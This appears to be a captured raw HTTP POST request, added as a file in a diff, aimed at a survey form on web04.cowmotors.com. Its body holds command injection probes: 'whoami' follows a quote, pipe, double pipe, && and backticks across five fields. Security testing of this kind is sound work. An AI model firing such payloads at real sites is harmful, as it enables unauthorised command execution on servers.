@@ -1,0 +1,15 @@
+POST /Home/Survey HTTP/1.1
+Host: web04.cowmotors.com
+Content-Length: 73
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Origin: http://web04.cowmotors.com
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://web04.cowmotors.com/Home/Preview
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+q1=%27whoami&q2=%7Cwhoami&q3=%7C%7Cwhoami&q4=%26%26whoami&q5=%60whoami%60
